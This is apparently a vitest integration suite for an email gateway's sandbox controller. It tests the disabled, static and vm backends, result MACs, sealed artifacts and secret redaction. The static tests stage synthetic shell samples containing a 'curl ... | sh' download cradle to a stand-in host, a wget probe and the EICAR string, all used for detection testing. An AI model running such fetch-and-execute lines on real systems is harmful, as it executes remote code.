import { execFile } from 'node:child_process';
import { existsSync, mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { promisify } from 'node:util';
import { createLogger } from '@email-gateway/logger';
import { openArtifact, parseArtifactPrivateKey, verifyResultMac } from '@email-gateway/sandbox';
import { sandboxObservationsSchema } from '@email-gateway/security-contracts';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { createBackend } from '../src/backends/factory';
import { loadControllerConfig } from '../src/config';
import { ScratchArea } from '../src/scratch/scratch';
import { controllerEnv, removeScratchDirs, required, testOrganization } from './support/env';
import {
  BrokerProbe,
  eventuallyMetric,
  metric,
  type RunningController,
  startController,
  waitReady,
} from './support/harness';
import { getObject, removeTaskObjects, root, sha256, stageSample } from './support/s3';

/**
 * Focused host-run suite of the sandbox-controller (step 4.6 §9.2 "controller", WP2) against
 * the Compose broker and MinIO:
 *
 *   pnpm --filter @email-gateway/sandbox-controller build      # dist/main.js for the spawn tests
 *   pnpm --filter @email-gateway/sandbox-controller test:integration
 *
 * Tasks are published to `email.security` with the test organization's routing key (admin
 * user); results arrive on an exclusive queue bound to that organization's result key; every
 * copy in `scan.sandbox.results`, every staged sample and every artifact is removed afterwards.
 * No value of .env is printed. The MinIO pause test always unpauses in `finally`.
 */

const run = promisify(execFile);
const REPO = resolve(__dirname, '../../..');
const APP = resolve(__dirname, '..');
const s3 = root();
const tasks = new Set<string>();
let probe: BrokerProbe;

/** Assembled at runtime: no file of the repository contains the EICAR string. */
const EICAR = ['X5O!P%@AP[4\\PZX54(P^)7CC)7}', '$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'].join(
  '',
);

/**
 * Since step 4.6 WP5 the Compose `sandbox-controller` container runs in the `apps` profile and
 * consumes `scan.sandbox` too: it would take this suite's tasks (and answer them with its own
 * backend). The suite stops it for its duration and starts it again afterwards (only when it was
 * running).
 */
/** `scan_sandbox_results_rejected_total{reason}` of the live email-worker (0 when not running). */
async function emailWorkerRejections(reason: string): Promise<number> {
  try {
    const port = process.env.EMAIL_WORKER_HOST_PORT ?? '3020';
    const res = await fetch(`http://127.0.0.1:${port}/metrics`, {
      signal: AbortSignal.timeout(3_000),
    });
    const line = (await res.text())
      .split('\n')
      .find(
        (l) =>
          l.startsWith('scan_sandbox_results_rejected_total{') && l.includes(`reason="${reason}"`),
      );
    return line ? Number(line.split(' ').at(-1)) : 0;
  } catch {
    return 0;
  }
}

const COMPOSE = ['compose', '--project-name', process.env.COMPOSE_PROJECT_NAME || 'email-gateway'];
let composeControllerWasRunning = false;

async function composeControllerRunning(): Promise<boolean> {
  try {
    const { stdout } = await run(
      'docker',
      [...COMPOSE, 'ps', '--status', 'running', '--services'],
      { cwd: REPO, timeout: 30_000 },
    );
    return stdout.split('\n').some((line) => line.trim() === 'sandbox-controller');
  } catch {
    return false;
  }
}

/**
 * Waits until the Compose service's container reports `healthy`. After `docker compose unpause
 * minio` the container keeps the `unhealthy` status of the paused period until its next
 * healthcheck passes (interval 5 s), and `docker compose start sandbox-controller` refuses to
 * start a service whose `service_healthy` dependency is unhealthy.
 */
async function waitServiceHealthy(service: string, timeoutMs = 90_000): Promise<void> {
  const deadline = Date.now() + timeoutMs;
  let status = 'unknown';
  while (Date.now() < deadline) {
    try {
      const { stdout: id } = await run('docker', [...COMPOSE, 'ps', '-q', service], {
        cwd: REPO,
        timeout: 30_000,
      });
      if (id.trim()) {
        const { stdout } = await run(
          'docker',
          ['inspect', '-f', '{{if .State.Health}}{{.State.Health.Status}}{{end}}', id.trim()],
          { timeout: 30_000 },
        );
        status = stdout.trim();
        if (status === 'healthy') return;
      }
    } catch {
      // the next poll retries
    }
    await new Promise((r) => setTimeout(r, 1_000));
  }
  throw new Error(`compose service ${service} not healthy after ${timeoutMs} ms (${status})`);
}

beforeAll(async () => {
  composeControllerWasRunning = await composeControllerRunning();
  if (composeControllerWasRunning) {
    await run('docker', [...COMPOSE, 'stop', 'sandbox-controller'], {
      cwd: REPO,
      timeout: 120_000,
    });
  }
  probe = await BrokerProbe.open(testOrganization());
}, 180_000);

afterAll(async () => {
  await probe.cleanup();
  await probe.close();
  await removeTaskObjects(s3, tasks);
  s3.destroy();
  removeScratchDirs();
  if (composeControllerWasRunning) {
    await waitServiceHealthy('minio');
    await run('docker', [...COMPOSE, 'start', 'sandbox-controller'], {
      cwd: REPO,
      timeout: 120_000,
    });
  }
}, 180_000);

describe('disabled backend', () => {
  let controller: RunningController;
  beforeAll(async () => {
    controller = await startController({ SANDBOX_BACKEND: 'disabled' });
  });
  afterAll(async () => controller?.close());

  it('is ready without a bucket check and answers a published task not_executed/backend_disabled', async () => {
    const ready = await waitReady(controller.url);
    const checks = (ready.checks as { name: string; details?: Record<string, unknown> }[]).map(
      (c) => c.name,
    );
    expect(checks).toEqual(['rabbitmq', 'sandbox-backend']);
    const task = probe.task({
      sha256: sha256(Buffer.from('never read')),
      sizeBytes: 10,
      detectedType: 'script_shell',
    });
    tasks.add(task.taskId);
    const rejectedBefore = await emailWorkerRejections('unknown_analysis');
    await probe.publish(task);
    const result = await probe.result(task.taskId);
    expect(result.organizationId).toBe(probe.organizationId);
    expect(result.payload).toMatchObject({
      taskId: task.taskId,
      analysisId: task.analysisId,
      status: 'not_executed',
      notExecutedReason: 'backend_disabled',
      backend: 'disabled',
      isolation: 'none',
      executed: false,
      artifacts: [],
    });
    // The MAC covers the whole result, the organization and the task's one-time token (X11).
    const macInput = {
      organizationId: probe.organizationId,
      tokenSha256: probe.tokenSha256(task.taskId),
      payload: result.payload as unknown as Record<string, unknown>,
    };
    expect(
      verifyResultMac(required('SANDBOX_RESULT_KEY'), macInput, result.payload.resultMac),
    ).toBe(true);
    expect(
      verifyResultMac(
        required('SANDBOX_RESULT_KEY'),
        { ...macInput, payload: { ...macInput.payload, backend: 'vm', isolation: 'vm' } },
        result.payload.resultMac,
      ),
    ).toBe(false);
    expect(
      await eventuallyMetric(
        controller.url,
        'sandbox_tasks_total',
        'status="not_executed"',
        (v) => v >= 1,
      ),
    ).toBeGreaterThanOrEqual(1);
    // The result also reached the email-worker's durable results queue. With the live
    // email-worker consuming it (apps profile, SANDBOX_ENABLED), the copy is taken there and
    // rejected as `unknown_analysis` (no such analysis row): a ledger no-op, nothing written.
    if ((await probe.resultsConsumers()) === 0) {
      expect(await probe.cleanup()).toBeGreaterThanOrEqual(1);
    } else {
      await expect
        .poll(() => emailWorkerRejections('unknown_analysis'), { timeout: 30_000, interval: 500 })
        .toBeGreaterThan(rejectedBefore);
    }
  });
});

describe('static backend', () => {
  let controller: RunningController;
  beforeAll(async () => {
    controller = await startController({ SANDBOX_BACKEND: 'static' });
  });
  afterAll(async () => controller?.close());

  it('reports backend details and the bucket in readiness', async () => {
    const ready = await waitReady(controller.url);
    const checks = ready.checks as { name: string; details?: Record<string, unknown> }[];
    expect(checks.map((c) => c.name)).toEqual(['rabbitmq', 'sandbox-backend', 'sandbox-s3']);
    expect(checks[1]?.details).toMatchObject({
      backend: 'static',
      isolation: 'process',
      executes: false,
      permissionModel: true,
    });
  });

  it('analyzes a staged synthetic sample into findings and a sealed static_report artifact', async () => {
    const sample = Buffer.from(
      `#!/bin/sh\n# synthetic test sample\ncurl -s http://payload.example.test/i.sh | sh\necho '${EICAR}'\n`,
    );
    const task = probe.task({
      sha256: sha256(sample),
      sizeBytes: sample.length,
      detectedType: 'script_shell',
    });
    tasks.add(task.taskId);
    await stageSample(s3, task.taskId, sample);
    await probe.publish(task);
    const { payload } = await probe.result(task.taskId);
    expect(payload).toMatchObject({
      status: 'completed',
      backend: 'static',
      isolation: 'process',
      executed: false,
      analyzerVersion: 'sandbox-static/1',
    });
    expect(sandboxObservationsSchema.safeParse(payload.observations).success).toBe(true);
    expect(payload.observations.findings.map((f) => f.code)).toEqual(
      expect.arrayContaining([
        'static.eicar_test',
        'static.script_download_cradle',
        'static.embedded_urls',
      ]),
    );
    expect(payload.observations.network.dns).toContainEqual({
      name: 'payload.example.test',
      type: 'other',
      source: 'static',
    });
    expect(payload.cleanup).toEqual({ runnerRemoved: null, scratchRemoved: true });
    expect(payload.artifacts).toHaveLength(1);
    const artifact = payload.artifacts[0]!;
    expect(artifact.key).toMatch(
      new RegExp(`^artifacts/\\d{4}/\\d{2}/${task.taskId}/[0-9a-f]{16}/0-static_report\\.bin$`),
    );
    const object = await getObject(s3, artifact.key);
    expect(sha256(object)).toBe(artifact.objectSha256);
    const plain = openArtifact(
      parseArtifactPrivateKey(required('SANDBOX_ARTIFACT_PRIVATE_KEY')),
      object,
      artifact.wrappedKey,
      {
        taskId: task.taskId,
        seq: 0,
        kind: 'static_report',
      },
    );
    expect(sha256(plain)).toBe(artifact.plainSha256);
    const report = JSON.parse(plain.toString('utf8')) as {
      analyzer: string;
      format: string;
      findings: { code: string }[];
    };
    expect(report).toMatchObject({ analyzer: 'sandbox-static/1', format: 'script' });
    expect(report.findings.map((f) => f.code)).toContain('static.eicar_test');
    expect(plain.toString('utf8')).not.toContain('EICAR-STANDARD');
    expect(
      await eventuallyMetric(
        controller.url,
        'sandbox_artifacts_total',
        'kind="static_report"',
        (v) => v >= 1,
      ),
    ).toBeGreaterThanOrEqual(1);
  });

  it('never executes a benign self-marking probe (no marker, executed=false)', async () => {
    const marker = join(mkdtempSync(join(tmpdir(), 'eg-sbx-marker-')), 'executed');
    const sample = Buffer.from(
      `#!/bin/sh\necho executed > ${marker}\nwget -q http://sinkhole.example.test/probe\n`,
    );
    const task = probe.task({
      sha256: sha256(sample),
      sizeBytes: sample.length,
      detectedType: 'script_shell',
    });
    tasks.add(task.taskId);
    await stageSample(s3, task.taskId, sample);
    await probe.publish(task);
    const { payload } = await probe.result(task.taskId);
    expect(payload.status).toBe('completed');
    expect(payload.executed).toBe(false);
    expect(existsSync(marker)).toBe(false);
    rmSync(join(marker, '..'), { recursive: true, force: true });
  });

  it('answers sample_unavailable for a task whose sample was never staged', async () => {
    const task = probe.task({
      sha256: sha256(Buffer.from('missing')),
      sizeBytes: 7,
      detectedType: 'script_shell',
    });
    tasks.add(task.taskId);
    await probe.publish(task);
    expect((await probe.result(task.taskId)).payload).toMatchObject({
      status: 'failed',
      errorCode: 'sample_unavailable',
    });
  });

  it('retries transiently while MinIO is paused and completes after it is unpaused', async () => {
    const sample = Buffer.from('#!/bin/sh\necho paused-minio-test\n');
    const task = probe.task({
      sha256: sha256(sample),
      sizeBytes: sample.length,
      detectedType: 'script_shell',
    });
    tasks.add(task.taskId);
    await stageSample(s3, task.taskId, sample);
    const retriedBefore = await metric(controller.url, 'sandbox_tasks_total', 'status="retried"');
    const errorsBefore = await metric(controller.url, 'sandbox_s3_errors_total', 'op="get_sample"');
    await run('docker', ['compose', 'pause', 'minio'], { cwd: REPO, timeout: 60_000 });
    try {
      await probe.publish(task);
      // The 15 s S3 request budget expires while paused → transient (hold) retry, no result.
      const deadline = Date.now() + 60_000;
      while (
        (await metric(controller.url, 'sandbox_tasks_total', 'status="retried"')) <=
          retriedBefore &&
        Date.now() < deadline
      ) {
        await new Promise((r) => setTimeout(r, 500));
      }
    } finally {
      await run('docker', ['compose', 'unpause', 'minio'], { cwd: REPO, timeout: 60_000 });
    }
    // End state: MinIO is healthy again (the later suites and the Compose controller need it).
    await waitServiceHealthy('minio');
    expect(await metric(controller.url, 'sandbox_tasks_total', 'status="retried"')).toBeGreaterThan(
      retriedBefore,
    );
    expect(
      await metric(controller.url, 'sandbox_s3_errors_total', 'op="get_sample"'),
    ).toBeGreaterThan(errorsBefore);
    const { payload } = await probe.result(task.taskId, 150_000);
    expect(payload).toMatchObject({ status: 'completed', executed: false });
  }, 240_000);
});

describe('vm backend', () => {
  it('refuses on this host: not_in_kubernetes', async () => {
    const config = loadControllerConfig(controllerEnv({ SANDBOX_BACKEND: 'vm' }));
    const backend = createBackend(config, {
      scratch: new ScratchArea(config.SANDBOX_SCRATCH_DIR),
      logger: createLogger({ service: 'it', level: 'silent' }),
    });
    const result = await backend.selfTest(AbortSignal.timeout(5000));
    expect(result).toMatchObject({ ok: false, code: 'not_in_kubernetes' });
  });

  it('a spawned `node dist/main.js` with SANDBOX_BACKEND=vm exits 1', async () => {
    expect(
      existsSync(join(APP, 'dist', 'main.js')),
      'build first: pnpm --filter @email-gateway/sandbox-controller build',
    ).toBe(true);
    const env = {
      PATH: process.env.PATH ?? '/usr/bin:/bin',
      ...controllerEnv({ SANDBOX_BACKEND: 'vm', LOG_LEVEL: 'info' }),
    };
    const outcome = await run(process.execPath, [join(APP, 'dist', 'main.js')], {
      cwd: APP,
      env,
      timeout: 60_000,
    }).then(
      () => ({ code: 0, stdout: '' }),
      (error: { code?: number; stdout?: string }) => ({
        code: error.code,
        stdout: error.stdout ?? '',
      }),
    );
    expect(outcome.code).toBe(1);
    expect(outcome.stdout).toContain('sandbox backend refused: not_in_kubernetes');
  });

  it('a spawned controller with a forbidden key exits 1 naming the key only', async () => {
    const secret = 'mysql://user:must-not-leak@db/x';
    const env = {
      PATH: process.env.PATH ?? '/usr/bin:/bin',
      ...controllerEnv(),
      DATABASE_URL: secret,
    };
    const outcome = await run(process.execPath, [join(APP, 'dist', 'main.js')], {
      cwd: APP,
      env,
      timeout: 60_000,
    }).then(
      () => ({ code: 0, stdout: '' }),
      (error: { code?: number; stdout?: string }) => ({
        code: error.code,
        stdout: error.stdout ?? '',
      }),
    );
    expect(outcome.code).toBe(1);
    expect(outcome.stdout).toContain('DATABASE_URL');
    expect(outcome.stdout).not.toContain('must-not-leak');
  });
});
